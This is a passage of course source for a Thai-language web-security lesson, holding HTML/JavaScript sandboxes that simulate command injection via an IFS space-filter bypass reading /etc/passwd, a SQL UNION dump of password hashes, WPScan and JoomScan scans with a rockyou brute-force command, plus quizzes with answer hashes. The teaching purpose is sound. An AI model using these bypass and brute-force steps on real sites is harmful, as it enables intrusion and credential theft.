<span style="font-size: 0.65rem; color: #64748b; font-weight: 800; letter-spacing: 0.06em; font-family: monospace;">🐚 Terminal Console</span>
<button style="background: rgba(59,130,246,0.1); border: 1px solid rgba(59,130,246,0.3); border-radius: 4px; color: #3b82f6; font-size: 0.68rem; padding: 3px 8px; cursor: pointer; font-family: monospace; font-weight: 700; transition: all 0.15s;" onclick="startWebSim('cmdtest')">▶ Run Simulation</button>
</div>
<div id="term-cmdtest" style="font-family: monospace; font-size: 0.76rem; color: #a7f3d0; padding: 12px 16px; white-space: pre-wrap; min-height: 90px;">
<span style="color: #3ddc84;">kali$</span> [กดปุ่ม Run Simulation เพื่อส่งคำสั่ง]
</div>
</div>
<div style="background: rgba(255, 255, 255, 0.02); border: 1px solid rgba(255, 255, 255, 0.05); border-radius: 8px; padding: 16px; font-size: 0.83rem; color: #cbd5e1; line-height: 1.65;">
<h5 style="margin: 0 0 8px; font-size: 0.85rem; color: #fbbf24; font-weight: bold;">⚙️ Command Description</h5>
<p style="margin: 0;">การเขียนตัวแปร IFS ช่วยเลี่ยงการกรองช่องว่าง ทำให้คำสั่งสามารถรันเพื่อเรียกดูไฟล์ระบบปฏิบัติการได้เหมือนเดิม</p>
</div>
</div>
</div>
</div>
<script>
window.showSandboxItem = function(itemKey, element) {
  const navButtons = document.querySelectorAll('.w-sandbox-nav button');
  navButtons.forEach(btn => {
    btn.style.borderColor = 'rgba(255, 255, 255, 0.06)';
    btn.style.color = '#cbd5e1';
    btn.style.background = 'rgba(255, 255, 255, 0.02)';
  });
  element.style.borderColor = '#3b82f6';
  element.style.color = '#ffffff';
  element.style.background = 'rgba(59, 130, 246, 0.05)';
  const panels = document.querySelectorAll('.w-sand-panel');
  panels.forEach(p => { p.style.display = 'none'; });
  const target = document.getElementById('panel-' + itemKey);
  if (target) { target.style.display = 'block'; }
}
window.startWebSim = function(itemKey) {
  const term = document.getElementById('term-' + itemKey);
  if (!term) return;
  term.innerHTML = '<span style="color:#64748b;">kali$</span> <span style="color:#ffffff; font-weight:bold;">Executing commands...</span>\\n[.] Verifying backend sanitization checks...';
  setTimeout(() => {
    if (itemKey === 'sqlitest') {
      term.innerHTML = '<span style="color:#64748b;">db-cli$</span> <span style="color:#3ddc84; font-weight:bold;">UNION select output:</span>\\nID: null | User: admin | Pass: <span style="color:#ef4444;">$2y$10$xyzPasswordHash...</span>\\nID: null | User: user1 | Pass: <span style="color:#ef4444;">$2y$10$abcHashUser1...</span>\\n\\n[+] Data exfiltration successful!';
    } else if (itemKey === 'cmdtest') {
      term.innerHTML = '<span style="color:#64748b;">kali$</span> <span style="color:#3ddc84; font-weight:bold;">cat /etc/passwd:</span>\\nroot:x:0:0:root:/root:/bin/bash\\nbin:x:1:1:bin:/bin:/sbin/nologin\\n\\n[+] Command completed without spaces.';
    }
  }, 1000);
}
</script>"""

val179_2 = """### ✏️ Lesson Quick Quiz (แบบทดสอบทบทวนความรู้ท้ายบทเรียน)

ตอบคำถามประเมินความรู้ 2 ข้อด้านล่างนี้ให้ถูกต้องครบถ้วนเพื่อทำการบันทึกความสำเร็จและปลดล็อกปุ่มบทเรียนถัดไป:

<div class="row align-items-center" style="margin:1.5rem auto; max-width:980px;"><div class="col-md-8"><div class="question-cell p-4 mb-3" style="background:rgba(255,255,255,0.015); border:1px solid rgba(255,255,255,0.04); border-radius:8px;"><p class="text-white mb-3" style="font-size:0.88rem; font-weight:600;">1. ช่องโหว่ Cross-Site Scripting (XSS) เกิดจากการลอบฝังแทรกสคริปต์โค้ดประเภทใดเข้ามาทำงานฝั่ง Client Browser?</p><div class="options-container" data-q="q1"><label class="w-quiz-option"><input type="radio" name="xss_lang" value="SQL" data-hash="false">SQL Query code</label><label class="w-quiz-option"><input type="radio" name="xss_lang" value="JavaScript" data-hash="78ec09be8733f52e505820464fdbb19d45388047970d47d457cb146ef279ec3d">JavaScript</label><label class="w-quiz-option"><input type="radio" name="xss_lang" value="Bash" data-hash="false">Bash Shell command</label><label class="w-quiz-option"><input type="radio" name="xss_lang" value="PHP" data-hash="false">PHP Server Script</label></div><button class="btn btn-warning px-4 mt-2 text-dark font-weight-bold" type="button" onclick="verifyMultipleChoice(this)"><i class="fas fa-paper-plane mr-1"></i> Submit</button><div class="feedback-msg mt-2" style="display:none; font-size:0.8rem; border-radius:4px; padding:6px 12px;"></div></div><div class="question-cell p-4 mb-3" style="background:rgba(255,255,255,0.015); border:1px solid rgba(255,255,255,0.04); border-radius:8px;"><p class="text-white mb-3" style="font-size:0.88rem; font-weight:600;">2. คีย์เวิร์ดมาตรฐาน HTML tag ใดที่นักโจมตีใช้ส่ง XSS Payload เพื่อเปิดจำลองกล่องป๊อปอัพ?</p><div class="options-container" data-q="q2"><label class="w-quiz-option"><input type="radio" name="xss_tag" value="script" data-hash="3a95aa975765796245d8b8ff716d0046522bb33f749eb721867c4e515d18d451"><span>&lt;script&gt;</span></label><label class="w-quiz-option"><input type="radio" name="xss_tag" value="iframe" data-hash="false"><span>&lt;iframe&gt;</span></label><label class="w-quiz-option"><input type="radio" name="xss_tag" value="div" data-hash="false"><span>&lt;div&gt;</span></label><label class="w-quiz-option"><input type="radio" name="xss_tag" value="img" data-hash="false"><span>&lt;img&gt;</span></label></div><button class="btn btn-warning px-4 mt-2 text-dark font-weight-bold" type="button" onclick="verifyMultipleChoice(this)"><i class="fas fa-paper-plane mr-1"></i> Submit</button><div class="feedback-msg mt-2" style="display:none; font-size:0.8rem; border-radius:4px; padding:6px 12px;"></div></div></div><div class="col-md-4 text-center"><div class="p-4" style="background:rgba(255,255,255,0.01); border:1px solid rgba(255,255,255,0.03); border-radius:12px; min-height:220px; display:flex; flex-direction:column; justify-content:center; align-items:center;"><span class="text-muted d-block mb-3" style="font-size:0.75rem; text-transform:uppercase; letter-spacing:0.1em;">Lesson Progress</span><div class="neon-gauge-container"><svg class="neon-gauge" viewBox="0 0 36 36"><path class="neon-gauge-bg" d="M18 2.0845 a 15.9155 15.9155 0 0 1 0 31.831 a 15.9155 15.9155 0 0 1 0 -31.831" /><path class="neon-gauge-fill" id="lesson-gauge-fill" stroke-dasharray="0, 100" d="M18 2.0845 a 15.9155 15.9155 0 0 1 0 31.831 a 15.9155 15.9155 0 0 1 0 -31.831" /><text x="18" y="20.35" class="neon-gauge-text" id="lesson-gauge-text">0%</text></svg></div><span id="lesson-status-txt" class="mt-3 d-block text-muted" style="font-size:0.78rem;">โปรดตอบคำถามให้ครบ 2 ข้อ</span></div></div></div>
<style>
.neon-gauge-container {position:relative; width:120px; height:120px;}
.neon-gauge {width:100%; height:100%;}
.neon-gauge-bg {fill:none; stroke:rgba(255,255,255,0.05); stroke-width:2.8;}
.neon-gauge-fill {fill:none; stroke:#3b82f6; stroke-width:2.8; stroke-linecap:round; transition:stroke-dasharray 0.5s ease, stroke 0.5s ease; filter:drop-shadow(0 0 5px rgba(59,130,246,0.5));}
.neon-gauge-text {fill:#ffffff; font-family:\'JetBrains Mono\',monospace; font-size:9px; font-weight:800; text-anchor:middle; filter:drop-shadow(0 0 2px rgba(255,255,255,0.3));}
</style>
<script>
const lessonKey = 'solved_lesson_179';
function getSavedSolves() { try { return JSON.parse(localStorage.getItem(lessonKey) || '[]'); } catch(e) { return []; } }
function updateLocalProgress() {
  const solved = getSavedSolves();
  const total = 2;
  const percent = Math.round((solved.length / total) * 100);
  const fill = document.getElementById('lesson-gauge-fill');
  const text = document.getElementById('lesson-gauge-text');
  const status = document.getElementById('lesson-status-txt');
  if (fill) fill.setAttribute('stroke-dasharray', `${percent}, 100`);
  if (text) text.textContent = `${percent}%`;
  if (solved.length === total) {
    if (fill) fill.style.stroke = '#3ddc84';
    if (status) status.innerHTML = '<span style="color:#3ddc84; font-weight:bold;"><i class="fas fa-check-circle mr-1"></i> ปลดล็อกบทเรียนถัดไปแล้ว</span>';
  } else {
    if (fill) fill.style.stroke = '#3b82f6';
    if (status) status.textContent = `ทำเสร็จแล้ว ${solved.length}/${total} ข้อ`;
  }
}
document.addEventListener('click', function(e) {
  const label = e.target.closest('.w-quiz-option');
  if (label) {
    const container = label.closest('.options-container');
    if (container) {
      container.querySelectorAll('.w-quiz-option').forEach(opt => opt.classList.remove('selected'));
      label.classList.add('selected');
      const radio = label.querySelector('input[type="radio"]');
      if (radio) radio.checked = true;
    }
  }
});
window.verifyMultipleChoice = function(button) {
  const cell = button.closest('.question-cell');
  const selectedRadio = cell.querySelector('input[type="radio"]:checked');
  const feedback = cell.querySelector('.feedback-msg');
  if (!selectedRadio) {
    feedback.className = "feedback-msg mt-2 alert-warning py-1.5 px-3 text-dark";
    feedback.innerHTML = '<i class="fas fa-exclamation-triangle mr-1"></i> กรุณาเลือกคำตอบ';
    feedback.style.setProperty('display', 'block', 'important');
    return;
  }
  const hashVal = selectedRadio.getAttribute('data-hash');
  if (hashVal !== 'false') {
    feedback.className = "feedback-msg mt-2 alert-success py-1.5 px-3 text-dark";
    feedback.innerHTML = '<i class="fas fa-check-circle mr-1"></i> คำตอบถูกต้อง!';
    feedback.style.setProperty('display', 'block', 'important');
    cell.querySelectorAll('input[type="radio"]').forEach(r => r.disabled = true);
    cell.querySelectorAll('.w-quiz-option').forEach(opt => opt.style.pointerEvents = 'none');
    button.disabled = true;
    const solved = getSavedSolves();
    if (!solved.includes(hashVal)) {
      solved.push(hashVal);
      localStorage.setItem(lessonKey, JSON.stringify(solved));
    }
    updateLocalProgress();
  } else {
    feedback.className = "feedback-msg mt-2 alert-danger py-1.5 px-3 text-white bg-danger border-0";
    feedback.innerHTML = '<i class="fas fa-times-circle mr-1"></i> คำตอบไม่ถูกต้อง ลองใหม่!';
    feedback.style.setProperty('display', 'block', 'important');
  }
}
setTimeout(() => {
  const solved = getSavedSolves();
  document.querySelectorAll('.options-container').forEach(container => {
    container.querySelectorAll('input[type="radio"]').forEach(radio => {
      const hash = radio.getAttribute('data-hash');
      if (solved.includes(hash)) {
        radio.checked = true;
        const label = radio.closest('.w-quiz-option');
        if (label) label.classList.add('selected');
        container.querySelectorAll('input[type="radio"]').forEach(r => r.disabled = true);
        container.querySelectorAll('.w-quiz-option').forEach(opt => opt.style.pointerEvents = 'none');
        const cell = container.closest('.question-cell');
        if (cell) {
          const btn = cell.querySelector('button');
          if (btn) btn.disabled = true;
          const fb = cell.querySelector('.feedback-msg');
          if (fb) {
            fb.className = "feedback-msg mt-2 alert-success py-1.5 px-3 text-dark";
            fb.innerHTML = '<i class="fas fa-check-circle mr-1"></i> เรียบร้อยแล้ว';
            fb.style.setProperty('display', 'block', 'important');
          }
        }
      }
    });
  });
  updateLocalProgress();
}, 200);
</script>"""

# ─── Lesson 180: CMS Exploitation & Vulnerability Audit ───
val180_0 = """## 🛡️ CMS Exploitation & Vulnerability Audit (การป้องกันและการทดสอบความปลอดภัยเว็บ)
---

ยินดีต้อนรับสู่บทเรียนการตรวจสอบความมั่นคงปลอดภัยและความเปราะบางของระบบจัดการเนื้อหาเว็บไซต์สำเร็จรูป (CMS)

### 📄 SLIDE 151-155: CMS Exploitation Overviews (ภาพรวมความเสี่ยงของเว็บสำเร็จรูป)
- **Content Management System (CMS)**: ระบบจัดการสารสนเทศและเนื้อหาเว็บสำเร็จรูปยอดฮิต เช่น WordPress, Joomla, Drupal และ Magento ซึ่งมักตกเป็นเป้าการเจาะระบบเพื่อดึงข้อมูลลับ ขโมยสิทธิ์ หรือลอบฝังคำสั่งประหาร (RCE)
- **อัตราครองส่วนแบ่งตลาดของระบบ CMS (สถิติล่าสุด)**:
  - **WordPress**: 62.7% (เป้าโจมตีอันดับหนึ่ง)
  - **Shopify**: 6.4%
  - **Wix**: 3.9%
  - **Squarespace**: 3.0%
  - **Joomla**: 2.4%
  - **Drupal**: 1.3%
- **โปรแกรมสแกนความมั่นคง CMS ที่ได้รับความนิยม**:
  - **WPScan**: เจาะจงสแกนช่องโหว่ WordPress (ใช้งานง่าย มีฐานข้อมูลปลั๊กอินช่องโหว่ขนาดใหญ่)
  - **JoomScan**: เจาะจงหาจุดอ่อนและค่าคอนฟิกผิดพลาดของระบบ Joomla
  - **Droopescan**: ตรวจสอบหาจุดอ่อนระบบ Drupal และ SilverStripe
  - **CMSeek**: โปรแกรมตรวจจับระบุแบรนด์ CMS อัตโนมัติและช่วยชี้เป้าช่องโหว่เบื้องต้น

---

### 📄 SLIDE 156-163: การทดสอบเจาะระบบ WordPress ด้วย WPScan
- **WPScan**: เป็นตัวสแกนความปลอดภัยเฉพาะด้านสัจจะ WordPress รันผ่าน CLI บนเครื่อง Kali Linux
- **ตัวเลือกคำสั่งดึงพารามิเตอร์ระบบ (--enumerate)**:
  - `--enumerate v` (ดึงข้อมูลเวอร์ชันหลักและช่องโหว่)
  - `--enumerate p` (ดึงรายชื่อปลั๊กอินทั้งหมด)
  - `--enumerate vp` (เจาะจงดึงเฉพาะปลั๊กอินที่มีช่องโหว่ความเสี่ยง)
  - `--enumerate vt` (ดึงเฉพาะธีมที่มีช่องโหว่)
  - `--enumerate u` (ดึงรายชื่อผู้ใช้งานเพื่อนำไป brute force)
  - `--enumerate cb` (ค้นหาไฟล์แบ็คอัปโครงสร้าง config)
- **ตัวอย่างการใช้คำสั่ง**:
  - สแกนเพื่อหาปลั๊กอินเปราะบาง:
    ```bash
    wpscan --url https://example.com --enumerate vp
    ```
  - สั่งทดสอบการเดารหัสผ่านล็อกอินแอดมิน:
    ```bash
    wpscan --url https://example.com --passwords rockyou.txt --usernames admin
    ```

---

### 📄 SLIDE 164-168: Joomla Exploitation ด้วย JoomScan
- **JoomScan**: พัฒนาขึ้นโดย OWASP เพื่อใช้วิเคราะห์เว็บระบบ Joomla
- **ชุดคำสั่งสำคัญ**:
  - `joomscan -u https://example.com` (สแกนระบบพื้นฐานหาจุดอ่อน)
  - `joomscan -u https://example.com --joomla-version` (ตรวจสอบสืบหาเวอร์ชันติดตั้งหลัก)
  - `joomscan -u https://example.com --components` (ค้นหาคอมโพเนนต์และปลั๊กอินเสริมที่มีช่องโหว่)
  - `joomscan -u https://example.com --enumerate-users` (ดึงรายชื่อผู้ใช้งานระบบ)

---

### 📄 SLIDE 169-191: ตัวอย่างกรณีศึกษาโจมตี CMS
- **Brute Force**: การสุ่มเดารหัสผ่านหน้าเว็บบอร์ดแผงควบคุม (เช่น `/wp-login.php` หรือ `/administrator/`) จนกว่าจะสามารถเข้าควบคุมสิทธิ์
- **Vulnerable Plugin**: การใช้ประโยชน์จากปลั๊กอินเสริมหรือธีมตกรุ่นที่มีสิทธิ์เขียนสไลด์ หรืออัปโหลดไฟล์ เช่น ปลั๊กอินแกลเลอรีภาพถ่าย ปล่อยให้แฮกเกอร์ลอบส่ง Web shell นามสกุล `.php` เข้ามาทับสิทธิ์ควบคุมเซิร์ฟเวอร์หลังบ้าน"""

val180_1 = """### 💻 CMS Security Audit Sandbox (จำลองเรียกสแกนความปลอดภัย CMS)

คลิกหัวข้อด้านซ้ายมือเพื่อศึกษาขั้นตอน และ **กดปุ่มรันจำลองการทำงานจริง (Run Simulation)** เพื่อดูผลการสแกนความเปราะบาง:

<style type="text/css">
.w-sandbox-main { display: flex !important; gap: 20px !important; margin: 1.5rem auto !important; max-width: 1000px !important; }
.w-sandbox-nav { width: 220px !important; display: flex !important; flex-direction: column !important; gap: 8px !important; flex-shrink: 0 !important; }
.w-nav-item { background: rgba(255, 255, 255, 0.02) !important; border: 1px solid rgba(255, 255, 255, 0.06) !important; border-radius: 6px !important; padding: 10px 14px !important; color: #cbd5e1 !important; text-align: left !important; cursor: pointer !important; font-size: 0.78rem !important; transition: all 0.2s !important; }
.w-nav-item:hover, .w-nav-item.active { border-color: #10b981 !important; color: #ffffff !important; background: rgba(16, 185, 129, 0.05) !important; }
.w-nav-item.active { font-weight: 700 !important; box-shadow: 0 0 8px rgba(16, 185, 129, 0.15) !important; }
.w-sandbox-panels { flex-grow: 1 !important; display: flex !important; flex-direction: column !important; gap: 14px !important; }
.w-sand-panel { display: none; background: #05070f !important; border: 1px solid rgba(255, 255, 255, 0.08) !important; border-radius: 10px !important; padding: 20px !important; box-shadow: 0 8px 24px rgba(0,0,0,0.45) !important; }
.w-sand-panel.active { display: block !important; }
</style>
<div class="w-sandbox-main" style="display: flex; gap: 20px; margin: 1.5rem auto; max-width: 1000px;">
<div class="w-sandbox-nav" style="width: 220px; display: flex; flex-direction: column; gap: 8px; flex-shrink: 0;">
<button id="nav-item-wpscan" class="w-nav-item active" style="background: rgba(255, 255, 255, 0.02); border: 1px solid rgba(255, 255, 255, 0.06); border-radius: 6px; padding: 10px 14px; color: #cbd5e1; text-align: left; cursor: pointer; font-size: 0.78rem; transition: all 0.2s;" onclick="showSandboxItem('wpscan', this)">1. WPScan Vulnerability</button>
<button id="nav-item-joomscan" class="w-nav-item" style="background: rgba(255, 255, 255, 0.02); border: 1px solid rgba(255, 255, 255, 0.06); border-radius: 6px; padding: 10px 14px; color: #cbd5e1; text-align: left; cursor: pointer; font-size: 0.78rem; transition: all 0.2s;" onclick="showSandboxItem('joomscan', this)">2. JoomScan Audit</button>
</div>
<div class="w-sandbox-panels" style="flex-grow: 1; display: flex; flex-direction: column; gap: 14px;">
<div id="panel-wpscan" class="w-sand-panel active" style="background: #05070f; border: 1px solid rgba(255, 255, 255, 0.08) !important; border-radius: 10px !important; padding: 20px !important; box-shadow: 0 8px 24px rgba(0,0,0,0.45) !important;">
<div style="font-size: 0.95rem; font-weight: 800; color: #ffffff; border-bottom: 1px solid rgba(255,255,255,0.06); padding-bottom: 10px; margin-bottom: 14px; display: flex; justify-content: space-between; align-items: center;">
<span>1. Scanning WordPress Vulnerabilities with WPScan</span>
<span style="font-size: 0.65rem; padding: 2px 8px; border-radius: 4px; background: rgba(16,185,129,0.08); border: 1px solid rgba(16,185,129,0.2); color: #10b981; font-family: monospace;">WPScan Tool</span>
</div>
<pre style="font-family: monospace; font-size: 0.8rem; color: #10b981; white-space: pre-wrap; margin: 0 0 12px; background: rgba(0,0,0,0.2); padding: 14px; border-radius: 8px; border: 1px solid rgba(255,255,255,0.02);">wpscan --url http://ctf.rpca.ac.th/wp/ --enumerate vp,u</pre>
<div style="background: #02040a; border: 1px solid rgba(255,255,255,0.06); border-radius: 8px; margin-bottom: 16px; overflow: hidden;">
<div style="background: rgba(255,255,255,0.03); padding: 6px 12px; border-bottom: 1px solid rgba(255,255,255,0.05); display: flex; justify-content: space-between; align-items: center;">
<span style="font-size: 0.65rem; color: #64748b; font-weight: 800; letter-spacing: 0.06em; font-family: monospace;">🐚 Terminal Console</span>
<button style="background: rgba(16,185,129,0.1); border: 1px solid rgba(16,185,129,0.3); border-radius: 4px; color: #10b981; font-size: 0.68rem; padding: 3px 8px; cursor: pointer; font-family: monospace; font-weight: 700; transition: all 0.15s;" onclick="startWebSim('wpscan')">▶ Run Simulation</button>
</div>
<div id="term-wpscan" style="font-family: monospace; font-size: 0.76rem; color: #a7f3d0; padding: 12px 16px; white-space: pre-wrap; min-height: 90px;">
<span style="color: #3ddc84;">kali$</span> [กดปุ่ม Run Simulation เพื่อยิงสแกน WPScan]
</div>
</div>
<div style="background: rgba(255,255,255,0.02); border: 1px solid rgba(255,255,255,0.05); border-radius: 8px; padding: 16px; font-size: 0.83rem; color: #cbd5e1; line-height: 1.65;">
<h5 style="margin: 0 0 8px; font-size: 0.85rem; color: #fbbf24; font-weight: bold;">⚙️ Command Description</h5>
<p style="margin: 0;">คำสั่งค้นหาระบุปลั๊กอินที่มีช่องโหว่ความเสี่ยง (`vp`) และตรวจสอบรายชื่อผู้ใช้งาน (`u`) เพื่อวางสเปกประเมินความปลอดภัย</p>
</div>
</div>
<div id="panel-joomscan" class="w-sand-panel" style="background: #05070f; border: 1px solid rgba(255, 255, 255, 0.08) !important; border-radius: 10px !important; padding: 20px !important; box-shadow: 0 8px 24px rgba(0,0,0,0.45) !important; display: none;">
<div style="font-size: 0.95rem; font-weight: 800; color: #ffffff; border-bottom: 1px solid rgba(255,255,255,0.06); padding-bottom: 10px; margin-bottom: 14px; display: flex; justify-content: space-between; align-items: center;">
<span>2. Assessing Joomla Website Security with JoomScan</span>
<span style="font-size: 0.65rem; padding: 2px 8px; border-radius: 4px; background: rgba(16,185,129,0.08); border: 1px solid rgba(16,185,129,0.2); color: #10b981; font-family: monospace;">JoomScan Tool</span>
</div>
<pre style="font-family: monospace; font-size: 0.8rem; color: #10b981; white-space: pre-wrap; margin: 0 0 12px; background: rgba(0,0,0,0.2); padding: 14px; border-radius: 8px; border: 1px solid rgba(255,255,255,0.02);">joomscan -u http://ctf.rpca.ac.th/joomla/ --components</pre>
<div style="background: #02040a; border: 1px solid rgba(255,255,255,0.06); border-radius: 8px; margin-bottom: 16px; overflow: hidden;">
<div style="background: rgba(255,255,255,0.03); padding: 6px 12px; border-bottom: 1px solid rgba(255,255,255,0.05); display: flex; justify-content: space-between; align-items: center;">
<span style="font-size: 0.65rem; color: #64748b; font-weight: 800; letter-spacing: 0.06em; font-family: monospace;">🐚 Terminal Console</span>
<button style="background: rgba(16,185,129,0.1); border: 1px solid rgba(16,185,129,0.3); border-radius: 4px; color: #10b981; font-size: 0.68rem; padding: 3px 8px; cursor: pointer; font-family: monospace; font-weight: 700; transition: all 0.15s;" onclick="startWebSim('joomscan')">▶ Run Simulation</button>
</div>
<div id="term-joomscan" style="font-family: monospace; font-size: 0.76rem; color: #a7f3d0; padding: 12px 16px; white-space: pre-wrap; min-height: 90px;">
<span style="color: #3ddc84;">kali$</span> [กดปุ่ม Run Simulation เพื่อเริ่มทำ JoomScan]
</div>
</div>
<div style="background: rgba(255, 255, 255, 0.02); border: 1px solid rgba(255, 255, 255, 0.05); border-radius: 8px; padding: 16px; font-size: 0.83rem; color: #cbd5e1; line-height: 1.65;">
<h5 style="margin: 0 0 8px; font-size: 0.85rem; color: #fbbf24; font-weight: bold;">⚙️ Command Description</h5>
<p style="margin: 0;">เมธอดตรวจสอบส่วนประกอบเสริม Joomla (components) เพื่อสืบค้นจุดรั่วไหลของซอร์สโค้ดและไลบรารีส่วนตัว</p>
</div>
</div>
</div>
</div>
<script>
window.showSandboxItem = function(itemKey, element) {
  const navButtons = document.querySelectorAll('.w-sandbox-nav button');
  navButtons.forEach(btn => {
    btn.style.borderColor = 'rgba(255, 255, 255, 0.06)';
    btn.style.color = '#cbd5e1';
    btn.style.background = 'rgba(255, 255, 255, 0.02)';
  });
  element.style.borderColor = '#10b981';
  element.style.color = '#ffffff';
  element.style.background = 'rgba(16, 185, 129, 0.05)';
  const panels = document.querySelectorAll('.w-sand-panel');
  panels.forEach(p => { p.style.display = 'none'; });
  const target = document.getElementById('panel-' + itemKey);
  if (target) { target.style.display = 'block'; }
}
window.startWebSim = function(itemKey) {
  const term = document.getElementById('term-' + itemKey);
  if (!term) return;
  term.innerHTML = '<span style="color:#64748b;">kali$</span> <span style="color:#ffffff; font-weight:bold;">Running CMS mapping audits...</span>\\n[.] Executing target scanner engines...';
  setTimeout(() => {
    if (itemKey === 'wpscan') {
      term.innerHTML = '<span style="color:#64748b;">kali$</span> <span style="color:#3ddc84; font-weight:bold;">WPScan Output:</span>\\nWordPress version: 6.2.2 (Outdated)\\nFOUND User: admin (ID: 1)\\nFOUND Vulnerable Plugin: contact-form-7 v5.7.1 (XSS vulnerable)\\n\\n[+] WPScan Completed!';
    } else if (itemKey === 'joomscan') {
      term.innerHTML = '<span style="color:#64748b;">kali$</span> <span style="color:#3ddc84; font-weight:bold;">OWASP Joomla! Vulnerability Scanner:</span>\\nJoomla! version: 3.9.22 (Outdated)\\nFOUND: http://ctf.rpca.ac.th/joomla/configuration.php-bak (CODE: 200)\\n\\n[+] JoomScan completed successfully.';
    }
  }, 1000);
}
</script>"""

val180_2 = """### ✏️ Lesson Quick Quiz (แบบทดสอบทบทวนความรู้ท้ายบทเรียน)

ตอบคำถามประเมินความรู้ 2 ข้อด้านล่างนี้ให้ถูกต้องครบถ้วนเพื่อทำการบันทึกความสำเร็จและปลดล็อกปุ่มบทเรียนถัดไป:

<div class="row align-items-center" style="margin:1.5rem auto; max-width:980px;"><div class="col-md-8"><div class="question-cell p-4 mb-3" style="background:rgba(255,255,255,0.015); border:1px solid rgba(255,255,255,0.04); border-radius:8px;"><p class="text-white mb-3" style="font-size:0.88rem; font-weight:600;">1. ส่วนหัว (Header) ความปลอดภัยใดใน HTTP Response ที่ใช้ป้องกันหน้าเว็บไม่ให้ถูกนำไปฝังใน Iframe เพื่อเลี่ยงช่องโหว่ Clickjacking?</p><div class="options-container" data-q="q1"><label class="w-quiz-option"><input type="radio" name="xframe_h" value="X-Frame-Options" data-hash="c9b7f5256e2978000bd93d8435d648b26e03fb21884be5e38f6b864a66e4a2cd">X-Frame-Options</label><label class="w-quiz-option"><input type="radio" name="xframe_h" value="CSP" data-hash="false">Content-Security-Policy</label><label class="w-quiz-option"><input type="radio" name="xframe_h" value="HSTS" data-hash="false">Strict-Transport-Security</label><label class="w-quiz-option"><input type="radio" name="xframe_h" value="XXSS" data-hash="false">X-XSS-Protection</label></div><button class="btn btn-warning px-4 mt-2 text-dark font-weight-bold" type="button" onclick="verifyMultipleChoice(this)"><i class="fas fa-paper-plane mr-1"></i> Submit</button><div class="feedback-msg mt-2" style="display:none; font-size:0.8rem; border-radius:4px; padding:6px 12px;"></div></div><div class="question-cell p-4 mb-3" style="background:rgba(255,255,255,0.015); border:1px solid rgba(255,255,255,0.04); border-radius:8px;"><p class="text-white mb-3" style="font-size:0.88rem; font-weight:600;">2. หลักปฏิบัติเพื่อความปลอดภัยในการป้องกันการแทรกโค้ดทำลายระบบเครือข่ายฐานข้อมูล (Injection) ทุกประเภทคือข้อใด?</p><div class="options-container" data-q="q2"><label class="w-quiz-option"><input type="radio" name="sec_coding" value="Input Validation" data-hash="277bc1b69ad3178c775080e7221f75355694a08ba1c38fa8b79f38ebcb5c8a41">การกรองตรวจสอบความถูกต้องข้อมูลนำเข้า (Input Validation)</label><label class="w-quiz-option"><input type="radio" name="sec_coding" value="Encryption" data-hash="false">การเข้ารหัสฐานข้อมูล (Database Encryption)</label><label class="w-quiz-option"><input type="radio" name="sec_coding" value="Backup" data-hash="false">การสำรองไฟล์ข้อมูลประจำวัน (Daily Backup)</label><label class="w-quiz-option"><input type="radio" name="sec_coding" value="IDS" data-hash="false">การติดตั้งระบบแจ้งเตือนแฮกเกอร์ (Intrusion Detection)</label></div><button class="btn btn-warning px-4 mt-2 text-dark font-weight-bold" type="button" onclick="verifyMultipleChoice(this)"><i class="fas fa-paper-plane mr-1"></i> Submit</button><div class="feedback-msg mt-2" style="display:none; font-size:0.8rem; border-radius:4px; padding:6px 12px;"></div></div></div><div class="col-md-4 text-center"><div class="p-4" style="background:rgba(255,255,255,0.01); border:1px solid rgba(255,255,255,0.03); border-radius:12px; min-height:220px; display:flex; flex-direction:column; justify-content:center; align-items:center;"><span class="text-muted d-block mb-3" style="font-size:0.75rem; text-transform:uppercase; letter-spacing:0.1em;">Lesson Progress</span><div class="neon-gauge-container"><svg class="neon-gauge" viewBox="0 0 36 36"><path class="neon-gauge-bg" d="M18 2.0845 a 15.9155 15.9155 0 0 1 0 31.831 a 15.9155 15.9155 0 0 1 0 -31.831" /><path class="neon-gauge-fill" id="lesson-gauge-fill" stroke-dasharray="0, 100" d="M18 2.0845 a 15.9155 15.9155 0 0 1 0 31.831 a 15.9155 15.9155 0 0 1 0 -31.831" /><text x="18" y="20.35" class="neon-gauge-text" id="lesson-gauge-text">0%</text></svg></div><span id="lesson-status-txt" class="mt-3 d-block text-muted" style="font-size:0.78rem;">โปรดตอบคำถามให้ครบ 2 ข้อ</span></div></div></div>
<style>
.neon-gauge-container {position:relative; width:120px; height:120px;}
.neon-gauge {width:100%; height:100%;}
.neon-gauge-bg {fill:none; stroke:rgba(255,255,255,0.05); stroke-width:2.8;}
.neon-gauge-fill {fill:none; stroke:#10b981; stroke-width:2.8; stroke-linecap:round; transition:stroke-dasharray 0.5s ease, stroke 0.5s ease; filter:drop-shadow(0 0 5px rgba(16,185,129,0.5));}
.neon-gauge-text {fill:#ffffff; font-family:\'JetBrains Mono\',monospace; font-size:9px; font-weight:800; text-anchor:middle; filter:drop-shadow(0 0 2px rgba(255,255,255,0.3));}
</style>
<script>
const lessonKey = 'solved_lesson_180';
function getSavedSolves() { try { return JSON.parse(localStorage.getItem(lessonKey) || '[]'); } catch(e) { return []; } }
function updateLocalProgress() {
  const solved = getSavedSolves();
  const total = 2;
  const percent = Math.round((solved.length / total) * 100);
  const fill = document.getElementById('lesson-gauge-fill');
  const text = document.getElementById('lesson-gauge-text');
  const status = document.getElementById('lesson-status-txt');
  if (fill) fill.setAttribute('stroke-dasharray', `${percent}, 100`);
  if (text) text.textContent = `${percent}%`;
  if (solved.length === total) {
    if (fill) fill.style.stroke = '#3ddc84';
    if (status) status.innerHTML = '<span style="color:#3ddc84; font-weight:bold;"><i class="fas fa-check-circle mr-1"></i> ปลดล็อกบทเรียนถัดไปแล้ว</span>';
  } else {
    if (fill) fill.style.stroke = '#10b981';
    if (status) status.textContent = `ทำเสร็จแล้ว ${solved.length}/${total} ข้อ`;
  }
}
document.addEventListener('click', function(e) {
  const label = e.target.closest('.w-quiz-option');
  if (label) {
    const container = label.closest('.options-container');
    if (container) {
      container.querySelectorAll('.w-quiz-option').forEach(opt => opt.classList.remove('selected'));
      label.classList.add('selected');
      const radio = label.querySelector('input[type="radio"]');
      if (radio) radio.checked = true;
    }
  }
});
window.verifyMultipleChoice = function(button) {
  const cell = button.closest('.question-cell');
  const selectedRadio = cell.querySelector('input[type="radio"]:checked');
  const feedback = cell.querySelector('.feedback-msg');
  if (!selectedRadio) {
    feedback.className = "feedback-msg mt-2 alert-warning py-1.5 px-3 text-dark";
